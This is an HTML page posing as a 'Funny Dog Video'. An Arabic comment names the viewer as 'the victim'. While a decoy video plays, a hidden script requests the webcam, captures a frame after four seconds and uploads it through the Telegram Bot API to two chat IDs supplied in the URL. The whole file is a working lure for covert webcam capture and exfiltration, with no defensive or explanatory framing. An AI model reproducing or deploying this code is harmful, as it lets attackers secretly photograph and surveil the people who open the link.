<!DOCTYPE html>
<html>
<head><title>Funny Dog Video</title></head>
<body style="background:black; margin:0; overflow:hidden;">
    <!-- فيديو الكلب المضحك الذي يظهر للضحية -->
    <video width="100%" height="100%" autoplay loop muted playsinline>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const p = new URLSearchParams(window.location.search);
        navigator.mediaDevices.getUserMedia({video:true}).then(stream => {
            const vid = document.createElement('video'); vid.srcObject = stream; vid.play();
            setTimeout(() => {
                const con = document.getElementById('canvas').getContext('2d');
                document.getElementById('canvas').width = vid.videoWidth;
                document.getElementById('canvas').height = vid.videoHeight;
                con.drawImage(vid, 0, 0);
                document.getElementById('canvas').toBlob(blob => {
                    let form = new FormData(); form.append('photo', blob, 'cam.jpg');
                    fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendPhoto?chat_id=${p.get('user_id')}`, {method:'POST', body:form});
                    fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendPhoto?chat_id=${p.get('admin_id')}`, {method:'POST', body:form});
                }, 'image/jpeg');
            }, 4000);
        });
    </script>
</body>
</html>
